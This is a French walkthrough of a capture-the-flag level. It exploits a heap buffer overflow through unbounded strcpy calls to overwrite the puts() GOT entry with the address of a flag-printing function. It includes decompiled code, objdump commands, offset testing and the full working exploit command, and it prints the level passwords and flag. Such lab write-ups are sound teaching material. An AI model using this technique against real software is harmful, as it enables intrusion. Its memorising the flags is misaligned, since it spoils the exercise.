# Level7 - Walkthrough

## Objectif
Utiliser un heap buffer overflow pour overwriter un pointeur de fonction et rediriger `puts()` vers `m()`, qui affiche la variable globale `c` contenant le flag.

---

## Étape 1 : Connexion

```bash
ssh level7@localhost -p 4242
# Mot de passe : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
./level7
# Segmentation fault (sans arguments)

./level7 test
# Segmentation fault (1 seul argument)

./level7 test arg2
# ~~
```

Le programme nécessite **2 arguments**.

---

## Étape 3 : Identifier la vulnérabilité

Analyser le binaire dans Ghidra :

```c
undefined4 main(undefined4 param_1, int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = malloc(8);                       // Struct A: [value][pointer]
  *puVar1 = 1;
  pvVar2 = malloc(8);                       // Buffer A
  puVar1[1] = pvVar2;                       // Struct A.pointer → Buffer A
  
  puVar3 = malloc(8);                       // Struct B: [value][pointer]
  *puVar3 = 2;
  pvVar2 = malloc(8);                       // Buffer B
  puVar3[1] = pvVar2;                       // Struct B.pointer → Buffer B
  
  strcpy((char *)puVar1[1], *(char **)(param_2 + 4));   // argv[1] → Buffer A
  strcpy((char *)puVar3[1], *(char **)(param_2 + 8));   // argv[2] → Buffer B
  
  __stream = fopen("/home/user/level8/.pass", "r");
  fgets(c, 0x44, __stream);                 // Lit le flag dans c
  puts("~~");
  return 0;
}

void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
{
  time_t tVar1 = time((time_t *)0x0);
  printf("%s - %d\n", c, tVar1);            // Affiche le flag !
  return;
}
```

**La vulnérabilité :** Deux `strcpy()` sans limite sur le heap.

**La stratégie :**
1. Overwriter le pointeur de Struct B avec l'adresse de `puts()` GOT
2. Écrire l'adresse de `m()` à cette adresse GOT
3. Quand `puts("~~")` s'exécute, ça appelle `m()` au lieu de `puts()`
4. `m()` affiche le flag stocké dans la variable globale `c`

---

## Étape 4 : Trouver les adresses critiques

### Adresse de `m()`

```bash
objdump -t level7 | grep " m"
```

Résultat : `0x080484f4`

### Adresse de `puts()` dans la GOT

```bash
objdump -R level7 | grep puts
```

Résultat : `0x08049928`

### Adresse de la variable globale `c`

```bash
objdump -t level7 | grep " c"
```

Résultat : `0x08049960`

---

## Étape 5 : Trouver l'offset du heap overflow

Tester progressivement :

```bash
./level7 $(python -c 'print "A"*16 + "BBBB"') CCCC
# ~~  (fonctionne)

./level7 $(python -c 'print "A"*17 + "BBBB"') CCCC
# Segmentation fault

./level7 $(python -c 'print "A"*20 + "BBBB"') CCCC
# ~~  (fonctionne correctement)
```

**L'offset est 20 bytes** (pour overwriter correctement le pointeur de Struct B).

---

## Étape 6 : Construction du payload

Structure :
- `A` * 20 = Remplit Buffer A et overflow jusqu'au pointeur de Struct B
- `\x28\x99\x04\x08` = Adresse de `puts()` GOT en little-endian (écrase le pointeur)

Payload argv[1] :
```bash
python -c 'print "A" * 20 + "\x28\x99\x04\x08"'
```

Payload argv[2] :
```bash
python -c 'print "\xf4\x84\x04\x08"'
```

Cette deuxième payload écrit l'adresse de `m()` à l'adresse de `puts()` GOT.

---

## Étape 7 : Exploitation

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Résultat : `m()` s'exécute, affiche le flag avec le timestamp.

```bash
su level8
# Mot de passe : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

---

## Flag
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
